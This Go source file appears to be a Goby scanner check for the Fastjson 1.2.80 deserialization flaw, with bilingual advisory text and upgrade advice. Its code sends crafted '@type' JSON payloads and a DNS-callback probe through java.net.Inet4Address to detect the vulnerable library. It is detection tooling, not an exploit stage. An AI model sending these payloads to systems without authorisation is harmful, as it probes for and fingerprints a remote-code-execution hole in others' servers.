package exploits

import (
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "Fastjson 1.2.80 and earlier Throwable deserialization vulnerability",
    "Description": "<p>Fastjson is a tool library for fast conversion of Java objects and JSON format strings open sourced by Alibaba.</p><p>Fastjson 1.2.80 and earlier versions use black and white lists to defend against deserialization vulnerabilities. After research, this defense strategy can bypass the default autoType shutdown restrictions under certain conditions and attack remote servers, which has a greater risk and impact.</p>",
    "Impact": "Fastjson 1.2.80 and earlier Throwable deserialization vulnerability",
    "Recommendation": "<p>1. Upgrade to the latest version 1.2.83</p><p>Upgrade to latest version 1.2.83 <a href=\"https://github.com/alibaba/fastjson/releases/tag/1.2.83\">https://github.com/alibaba/fastjson/releases/tag/1.2.83</a></p><p>This version involves changes in autotype behavior. In some scenarios, there will be incompatibilities. If you encounter problems, you can go to <a href=\"https://github.com/alibaba/fastjson/issues\">https://github.com/alibaba/fastjson/issues</a> for help.</p><p>2. SafeMode reinforcement</p><p>Fastjson introduced safeMode in 1.2.68 and later versions. After configuring safeMode, autoType is not supported regardless of whitelist or blacklist, which can prevent the deserialization Gadgets variant attack (close autoType and pay attention to evaluating the impact on business), Please refer to <a href=\"https://github.com/alibaba/fastjson/wiki/fastjson_safemode\">https://github.com/alibaba/fastjson/wiki/fastjson_safemode</a> to see how to enable it.</p><p>3. Upgrade to Fastjson v2</p><p>Fastjson v2 address <a href=\"https://github.com/alibaba/fastjson2/releases\">https://github.com/alibaba/fastjson2/releases</a></p><p>Fastjson has open source version 2.0. In version 2.0, whitelist is no longer provided for compatibility, which improves security. Fastjson v2 code has been rewritten, and the performance has been greatly improved. It is not fully compatible with 1.x. The upgrade requires serious compatibility testing. There is a problem with the upgrade, you can ask for help at <a href=\"https://github.com/alibaba/fastjson2/issues.\">https://github.com/alibaba/fastjson2/issues.</a></p>",
    "Product": "fastjson",
    "VulType": [
        "Command Execution"
    ],
    "Tags": [
        "Command Execution"
    ],
    "Translation": {
        "CN": {
            "Name": "Fastjson 1.2.80 及之前版本存在 Throwable 反序列化漏洞",
            "Description": "<p>Fastjson 是阿里巴巴开源的 Java 对象和 JSON 格式字符串的快速转换的工具库。</p><p>Fastjson 1.2.80 及之前版本使用黑白名单用于防御反序列化漏洞，经研究该防御策略在特定条件下可绕过默认 autoType 关闭限制，攻击远程服务器，风险影响较大。</p>",
            "Impact": "<p>Fastjson 1.2.80版本以下，无需Autotype开启，攻击者即可通过精心构造的请求包在使用Fastjson的服务器上进行远程代码执行。<br></p>",
            "Recommendation": "<p>1、升级到最新版本1.2.83：<a href=\"https://github.com/alibaba/fastjson/releases/tag/1.2.83\">https://github.com/alibaba/fastjson/releases/tag/1.2.83</a></p><p>该版本涉及autotype行为变更，在某些场景会出现不兼容的情况，如遇遇到问题可以到 <a href=\"https://github.com/alibaba/fastjson/issues\">https://github.com/alibaba/fastjson/issues</a> 寻求帮助。</p><p>2、safeMode 加固</p><p>Fastjson 在1.2.68及之后的版本中引入了 safeMode，配置 safeMode 后，无论白名单和黑名单，都不支持 autoType，可杜绝反序列化Gadgets类变种攻击（关闭 autoType 注意评估对业务的影响），可参考 <a href=\"https://github.com/alibaba/fastjson/wiki/fastjson_safemode\">https://github.com/alibaba/fastjson/wiki/fastjson_safemode</a> 查看开启方法。</p><p>3、升级到 Fastjson v2</p><p>Fastjson v2地址 <a href=\"https://github.com/alibaba/fastjson2/releases\">https://github.com/alibaba/fastjson2/releases</a></p><p>Fastjson 已经开源2.0版本，在2.0版本中，不再为了兼容提供白名单，提升了安全性。Fastjson v2 代码已经重写，性能有了很大提升，不完全兼容1.x，升级需要做认真的兼容测试。升级遇到问题，可以在 <a href=\"https://github.com/alibaba/fastjson2/issues\">https://github.com/alibaba/fastjson2/issues</a> 寻求帮助。</p><p><span style=\"color: rgb(51, 51, 51);\"></span><a href=\"https://jenkins.io/zh/\" target=\"_blank\"></a></p>",
            "Product": "fastjson",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "Fastjson 1.2.80 and earlier Throwable deserialization vulnerability",
            "Description": "<p>Fastjson is a tool library for fast conversion of Java objects and JSON format strings open sourced by Alibaba.</p><p>Fastjson 1.2.80 and earlier versions use black and white lists to defend against deserialization vulnerabilities. After research, this defense strategy can bypass the default autoType shutdown restrictions under certain conditions and attack remote servers, which has a greater risk and impact.</p>",
            "Impact": "Fastjson 1.2.80 and earlier Throwable deserialization vulnerability",
            "Recommendation": "<p>1. Upgrade to the latest version 1.2.83</p><p>Upgrade to latest version 1.2.83 <a href=\"https://github.com/alibaba/fastjson/releases/tag/1.2.83\">https://github.com/alibaba/fastjson/releases/tag/1.2.83</a></p><p>This version involves changes in autotype behavior. In some scenarios, there will be incompatibilities. If you encounter problems, you can go to <a href=\"https://github.com/alibaba/fastjson/issues\">https://github.com/alibaba/fastjson/issues</a> for help.</p><p>2. SafeMode reinforcement</p><p>Fastjson introduced safeMode in 1.2.68 and later versions. After configuring safeMode, autoType is not supported regardless of whitelist or blacklist, which can prevent the deserialization Gadgets variant attack (close autoType and pay attention to evaluating the impact on business), Please refer to <a href=\"https://github.com/alibaba/fastjson/wiki/fastjson_safemode\">https://github.com/alibaba/fastjson/wiki/fastjson_safemode</a> to see how to enable it.</p><p>3. Upgrade to Fastjson v2</p><p>Fastjson v2 address <a href=\"https://github.com/alibaba/fastjson2/releases\">https://github.com/alibaba/fastjson2/releases</a></p><p>Fastjson has open source version 2.0. In version 2.0, whitelist is no longer provided for compatibility, which improves security. Fastjson v2 code has been rewritten, and the performance has been greatly improved. It is not fully compatible with 1.x. The upgrade requires serious compatibility testing. There is a problem with the upgrade, you can ask for help at <a href=\"https://github.com/alibaba/fastjson2/issues.\">https://github.com/alibaba/fastjson2/issues.</a></p>",
            "Product": "fastjson",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "FofaQuery": "header=\"application/json\"",
    "GobyQuery": "header=\"application/json\"",
    "Author": "992271865@qq.com",
    "Homepage": "https://github.com/alibaba/fastjson/",
    "DisclosureDate": "2022-05-23",
    "References": [
        "https://fofa.so/"
    ],
    "HasExp": false,
    "Is0day": false,
    "Level": "3",
    "CVSS": "9.8",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [],
    "ExpTips": {
        "type": "Tips",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "6973"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			payload1 := "{\"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\"}}"
			payload2 := "{\"b\":{\"@type\":\"java.lang.String\"}}"
			payload3 := "{\"b\":{\"@type\":\"java.lang.RuntimeException\"}}"
			payload4 := "[{\"a\":\"a\\x]"
			checkStr := goutils.RandomHexString(4)
			checkUrl, _ := godclient.GetGodCheckURL(checkStr)
			payload5 := "{\"a\":{\n\"@type\":\"java.lang.RuntimeException\",\n\"@type\":\"java.net.Inet4Address\",\"val\":\"" + checkUrl + "\"}}"
			cfg := httpclient.NewPostRequestConfig("/")
			cfg.Header.Store("Content-Type", "application/json")
			cfg.FollowRedirect = false
			cfg.VerifyTls = false
			cfg.Data = payload4
			if resp4, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				matched, _ := regexp.MatchString("fastjson(-| )version 1\\.[0-2]\\.(\\d|[1-7]\\d|80)(,|;)", resp4.Utf8Html)
				if matched {
					return true
				} else {
					cfg.Data = payload1
					if resp1, err := httpclient.DoHttpRequest(u, cfg); err == nil {
						if strings.Contains(resp1.Utf8Html, "autoType is not support") {
							cfg.Data = payload3
							if resp3, err := httpclient.DoHttpRequest(u, cfg); err == nil {
								if !strings.Contains(resp3.Utf8Html, "autoType is not support") {
									return true
								}
							}
						} else {
							cfg.Data = payload2
							if resp2, err := httpclient.DoHttpRequest(u, cfg); err == nil {
								if resp1.StatusCode != resp2.StatusCode {
									cfg.Data = payload3
									if resp3, err := httpclient.DoHttpRequest(u, cfg); err == nil {
										if resp3.StatusCode == resp2.StatusCode {
											return true
										}
									}
								}
							}
						}
					}
				}
			} else {
				cfg.Data = payload5
				if _, err := httpclient.DoHttpRequest(u, cfg); err == nil {
					return godclient.PullExists(checkStr, 10*time.Second)
				}
			}
			return false
		},
		nil,
	))
}
